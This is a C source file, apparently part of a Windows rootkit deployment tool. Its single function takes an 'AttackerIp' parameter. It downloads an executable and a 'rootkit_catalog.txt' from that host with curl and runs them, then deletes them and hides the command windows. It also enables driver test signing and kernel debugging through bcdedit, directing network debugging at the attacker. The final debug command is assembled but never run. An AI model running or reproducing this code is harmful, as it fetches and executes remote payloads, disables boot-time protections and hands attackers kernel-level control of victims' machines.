#include "configurations.h"


BOOL FilesAndDebugging(const char* AttackerIp, const char* DebugPort, const char* DebugKey) {
	char ExecuteCommand[1024] = { 0 };
	if (AttackerIp == NULL) {
		printf("[-] Cannot get needed files on target machine - attacker's IP address is not specified!\n");
		return FALSE;
	}
	ShellExecuteA(0, "open", "cmd.exe",
		"/C taskkill /F /IM MainMedium.exe > nul", 0, SW_HIDE);
	ShellExecuteA(0, "open", "cmd.exe",
		"/C rmdir /s /q C:\\9193bbfd1a974b44a49f740ded3cfae7a03bbedbe7e3e7bffa2b6468b69d7097 > nul", 0, SW_HIDE);
	ShellExecuteA(0, "open", "cmd.exe",
		"/C mkdir C:\\9193bbfd1a974b44a49f740ded3cfae7a03bbedbe7e3e7bffa2b6468b69d7097\\42db9c51385210f8f5362136cc2ef5fbaddfff41cb0ef4fab0a80d211dd16db5 > nul", 0, SW_HIDE);
	
	strcat_s(ExecuteCommand, "curl http://");
	strcat_s(ExecuteCommand, AttackerIp);
	strcat_s(ExecuteCommand, ":8080/WebScraper/x64/Release/WebScraper.exe --output WebScraper.exe");
	system(ExecuteCommand);
	RtlZeroMemory(ExecuteCommand, 1024);
	
	strcat_s(ExecuteCommand, "curl http://");
	strcat_s(ExecuteCommand, AttackerIp);
	strcat_s(ExecuteCommand, ":8080/rootkit_catalog.txt --output rootkit_catalog.txt");
	system(ExecuteCommand);
	RtlZeroMemory(ExecuteCommand, 1024);

	strcat_s(ExecuteCommand, "WebScraper.exe rootkit_catalog.txt ");
	strcat_s(ExecuteCommand, AttackerIp);
	system(ExecuteCommand);
	RtlZeroMemory(ExecuteCommand, 1024);

	ShellExecuteA(0, "open", "cmd.exe", "/C del /s /q rootkit_catalog.txt > nul", 0, SW_HIDE);
	ShellExecuteA(0, "open", "cmd.exe", "/C del /s /q WebScraper.exe > nul", 0, SW_HIDE);

	ShellExecuteA(0, "open", "cmd.exe", "/C bcdedit /set TESTSIGNING ON > nul", 0, SW_HIDE);
	ShellExecuteA(0, "open", "cmd.exe", "/C bcdedit /set DEBUG ON > nul", 0, SW_HIDE);
	strcat_s(ExecuteCommand, "/C bcdedit /dbgsettings NET HOSTIP:");
	strcat_s(ExecuteCommand, AttackerIp);
	strcat_s(ExecuteCommand, " PORT:");
	strcat_s(ExecuteCommand, DebugPort);
	strcat_s(ExecuteCommand, " KEY:");
	strcat_s(ExecuteCommand, DebugKey);
	return TRUE;
}